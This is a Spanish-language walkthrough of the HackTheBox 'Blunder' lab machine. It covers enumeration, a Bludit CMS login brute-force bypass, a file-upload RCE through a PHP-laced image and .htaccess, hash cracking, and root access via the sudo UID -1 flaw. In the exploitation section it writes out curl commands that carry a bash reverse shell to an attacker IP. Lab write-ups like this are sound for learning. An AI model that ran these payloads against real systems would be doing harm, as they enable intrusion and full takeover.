---
layout      : post
title       : "HackTheBox - Blunder"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/bannerblunder.png
category    : [ htb ] 
tags        : [ CMS, file-upload, cracking, sudo ]
---
Máquina Linux nivel fácil. Romperemos un CMS, encontraremos un File Upload que explotaremos para ejecutar comandos. Crackearemos cositas y nos apoyaremos de una locura relacionada con "sudo -l" para convertirnos en administradores del sistema.

![blunderHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/blunderHTB.png)

### TL;DR (Spanish writeup)

Wenas, en esta máquina nos encontraremos con el puerto 80, el cual haciéndole un poco de fuzzing se nos listaran: un apartado `/admin` y un archivo `/todo.txt`. En **/admin** hay un login y encontraremos que el servicio está siendo soportado por él `CMS Bludit`, basado en ello encontraremos un exploit que hace un bypass del login, con esto (y haciendo un diccionario del sitio) lograremos entrar al dashboard como el usuario `fergus`.

Estando dentro explotaremos una vulnerabilidad `file upload`, cambiaremos su contenido y pondremos código `.php` que nos permita ejecutar comandos en el sistema y así obtener una reverse Shell. Estando dentro de la máquina como `www-data` encontraremos en la estructura del CMS un archivo `users.php` en el que se listan hashes e información útil de algunos usuarios, crackearemos el `hash` de `hugo` para usar esa contraseña y obtener una sesión como él.

Realizando enumeración básica (`sudo -l`) veremos algo raro, nos apoyaremos en esa locura para buscar y encontrar una manera de obtener una Shell como usuario `root`. Démosle :)

* Apoyado en un exploit (que abajo listaré) cree un [autopwn](https://github.com/lanzt/blog/tree/main/assets/scripts/HTB/blunder/autopwn_blunder.py) en python para obtener una shell desde el mismo programa (:

> Claramente vas a encontrar mucho texto, pero como he dicho en otros writeups, me enfoco en plasmar mis errores y existos, asi mismo aveces explico algo de más y me inspiro hablando (:

...

Tendremos 3 fases.

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración {#enumeracion}

Como siempre, iniciamos haciendo un escaneo de puertos para así conocer que servicios está corriendo la maquina. En este caso con parámetros normales el escaneo va lento, así que le agregamos algunos para acelerar el proceso.

```bash
$ nmap -vvv -sS -Pn --min-rate=5000 -p- --open 10.10.10.191 -oG initScan
```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -vvv       | Permite ver en consola lo que va encontrando                                        |
| -sS        | Quita la opción por defecto TCP SYN, así evitamos que haga una petición de conexión |
| -Pn        | Evita que realice Host Discovery, como resolución DNS y Ping                        |
| --min-rate | Indica que no queremos hacer peticiones menores al num que pongamos                 |
| -p-        | Escanea todos los puertos                                                           |
| --open     | Solo los puertos que están abiertos                                                 |
| -oG        | Guarda el output en un archivo con formato grepeable                                |

![nmapInitScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/initScan.png)

Ahora hacemos el escaneo para verificar que versión y que scripts puede manejar el servicio que encontramos.

```bash
$ nmap -sC -sV -p80 10.10.10.191 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -p        | Escaneo de los puertos obtenidos                       |
| -oN       | Guarda el output en un archivo                         |

![nmaPortScan](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/portScan.png)

Tenemos el puerto 80, una pagina web, veamo que se cuece :P

![webpage](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/webpage.png)

No hay nada a primera vista, vamos a hacer fuerza bruta sobre el dominio con [`$ dirsearch`](https://github.com/maurosoria/dirsearch). Solo tenemos un apartado `/admin` que nos muestra un login y un texto sobre **Bludit**, buscando en internet vemos que es un *CMS*, por lo tanto sabemos que la pagina esta soportada por este CMS.

Con respecto a **Bludit** ya tenemos otro enfoque, podemos ir a internet o con *searchsploit* y buscar algún exploit relacionado con ese servicio. Haciendo un research en la documentación y dando vueltas, encontré que la versión que está corriendo de Bludit se puede listar acá:

```html
http://10.10.10.191/bl-plugins/version/metadata.json
```

```bash
version	"3.9.2"
```

Con *searchsploit* encontramos un script que hace un **bypass**, saltándose el bloqueo de IP por intentos fallidos al hacer login incorrectamente. 

* [Exploit 1: rastating - bludit-brute-force-mitigation-bypass](https://rastating.github.io/bludit-brute-force-mitigation-bypass/).
* [Exploit 2: rastating - bypass anti-brute](https://github.com/bludit/bludit/pull/1090).

**El exploit es muy interesante, léanselo! :)**

Listo, lo que sigue es tener posibles credenciales y probarlos con él.

Así que tome la página, lei cada artículo para ver que destacaba, nombres, palabras raras, números por ahí al azar. Y con ello armar un wordlist para posteriormente usarlos como **user** y **pw**.

Adecuando el script para que lea el wordlist que le pasemos, quedaria algo asi: 

...

![fileinputscript](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/fileinputscript.png)

...

Pero no sirvio ninguno :( Sin saber que hacer, usé otra herramienta de *fuzz web* a ver si era que me habia olvidado algo. Encontre `$ gobuster`, asi que decidi usarla a ver si con ella podria tener diferentes resultados. 

```bash
$ gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/directory-list-2.3-small.txt -t 30 -x .html,.php,.txt,.js
```

* **-u**: Le indico el objetivo 
* **-w**: El path del wordlist con el que quiero probar
* **-t**: Los hilos con los que debe correr el proceso
* **-x**: Las extensiones a buscar

Efectivamente, algo no habia aparecido con `$ dirsearch`, **todo.txt**.

```html
http://10.10.10.191/todo.txt
```

![todotxt](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/todo_txt.png)

Perfecto, obtenemos un presunto nombre/usuario, **fergus**. Pero ¿y su contraseña?, pues usando la wordlist podemos probar :) 

![ferguslogin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/ferguslogin.png)

![fergusdashboard](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/fergusdashboard.png)

Listo, baby... dentro. Buscando en internet encontré una vulnerablidad que explota una funcionalidad para subir imagenes en `/new-content`, permitiendo **corromper el contenido** del archivo en cuestión. Asi que si se sube un archivo `.jpg` pero con **contenido `php`** se podra conseguir ejecutar comandos (o lo que sea) con php (:

En este caso con el archivo que subiremos, podremos ejecutar comandos y finalmente crear una reverse shell.

* [POC del exploit](https://github.com/bludit/bludit/issues/1081).

...

## Explotación {#explotacion}

Deeeeeeeespues de mucho sufrimiento, confundido con el POC por que simplemente siguiendo los pasos no obtenia nada, intente algo diferente (sencillo, basico y que debi probar al inicio :P) un RCE con un simple **system** y **echo**. Logre obtener resultados, hice estos pasos:

* Como se muestra en el POC se captura la petición mediante BurpSuite.
* Se modifica el contenido.

![burpImage](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/burpImage.png)

Verificando...

![burpCheckImage](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/burpCheckImage.png)

* Subir el archivo `.htaccess` para que el servidor interprete las imagenes `jpg` con contenido `php` 

![burphtaccess](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/burphtaccess.png)

* Hacer peticiones hacia el archivo creado, asi validamos que si encuentra el archivo en el sistema

![burpcontrol](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/burpcontrol.png)

* Verificar que podamos ejecutar comandos.

![webRCE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/webRCE.png)

Listo, ahora podemos intentar subir una reverse shell... 

Habia probado encodear la URL pero solo lo hice con algunos caracteres, ya que al ejecutar el comando en limpio no pasaba nada, pero despues probé encodear toda la URL y así si me funciono :) 

De esto:

```bash
$ curl http://10.10.10.191/bl-content/tmp/buenobueno.jpg?xmd=bash -c 'bash -i >& /dev/tcp/10.10.15.26/443 0>&1'
```

A esto:

```bash
$ curl http://10.10.10.191/bl-content/tmp/buenobueno.jpg?xmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.26%2F443%200%3E%261%27
```

![revshellwww](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/revshellwww.png)

Perfe, el problema es que con la shell que tengo estoy limitado ya que no puedo volver a algun comando que haya escrito, asi que la transformaré para que sea completamente interactiva.

* [Convertir a una shell completamente interactiva](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).
* [Varias opciones](https://netsec.ws/?p=337).
* [Resumido y facil (Gracias s4vitar)](https://www.youtube.com/watch?v=amKkzk-yP14&t=953).

Ahora si, a seguir enumerando :)

![usersphp](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/usersphp.png)

Interesante, primero a saber que tipo de **hash** es y ver si lo podemos romper.

Pues despues de muchos intentos, herramientas online y herramientas del escritorio no logré romper el hash... Sencillamente por que no habia enumerado bien y habia caido en un hoyo para ratones :s **Recuerden, enumeren todo**, pues al ir recorriendo las carpetas vi que hay dos versiones de **bludit** corriendo en el sistema, como era de esperar tiene la misma estructura que la version `3.9.2`, asi que tenemos el archivo `users.php`. 

El hash presuntamente es **SHA1**.

![bludit3_10_0](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/bludit3_10_0.png)

Tengo esto :sss

![hugoHash](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/hugoHash.png)

Este hash es tambien **SHA1**, probe instantaneamente con una herramienta online que tenia a la mano. Tambien probé con **john** y **hashcat** pero el problema es que esa password de **hugo** no esta en los wordlist por default o tradicionales.

> Además ojeando una carpeta dentro del `$ /home` de **hugo** llamada `/.mozilla`, en algunos archivos se hace alusion a [crackstation](https://crackstation.net/) como cache o historial.

![resultHugoHash](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/resultHugoHash.png)

Listo, tenemos un resultado, probando esa password con **hugo** tenemos una shell en el sistema.

![shellHugo](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/shellHugo.png)

...

## Escalada de privilegios {#escalada-de-privilegios}

Al ver los permisos que tiene **hugo** me confundi, asi que le cai a google. Basicamente lo que dice es que podemos correr `$ /bin/bash` con cualquier usuario peeero no con **root**... :( 

Pero existe una vulnerabilidad en esa instrucción, en linux el **UID de root es 0**, lo que encontraron es que al asignarle a `sudo` algunos de estos UID (Identificador de usuario): `-1 o 4294967295` los interpreta mal y los hace pasar como `0`, permitiendo asi ejecutar comandos como el usuario **root**.

* [Explicación 1: muylinux - vulnerabilidad-sudo-saltarse-restricciones-root](https://www.muylinux.com/2019/10/16/vulnerabilidad-sudo-saltarse-restricciones-root/).
* [Explicación 2: hackwise.mx - esta-vulnerabilidad-sudo-te-permite-ejecutar-comandos-como-root](https://hackwise.mx/esta-vulnerabilidad-sudo-te-permite-ejecutar-comandos-como-root/).

Según eso, la explotación quedaria así:

![roottxt](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/blunder/roottxt.png)

YyyyyyyyyYYyYyY obtenemos nuestra shell como root (:

Una forma nueva para mi y sencilla de escalar privilegios, el inicio de la maquina fue caotico pero despues me enganche (esta maquina la hice primero que la de [Magic](), por eso en ese writeup comento que me fue mas facil ver la explotacion del apartado `/upload`) y me gusto mucho, gracias por leer y a seguir rompiendo conocimiento (: 

...

## Autopwn.

Apoyandome en un [exploit](https://www.exploit-db.com/exploits/48568) que ejecuta el mismo proceso que realizamos con el POC, cree un `.py` para obtener una shell desde el mismo programa. (Tambien me apoye en los autopwn de [s4vitar](https://www.youtube.com/c/s4vitar/videos))

Y cuando tengas la shell, pones las lineas (para ser hugo y despues root) que estan en este writeup. (Ya que no entendi como hacerlo en el propio script).

* Acá el [autopwn](https://github.com/lanzt/blog/tree/main/assets/scripts/HTB/blunder/autopwn_blunder.py)

Bless :)
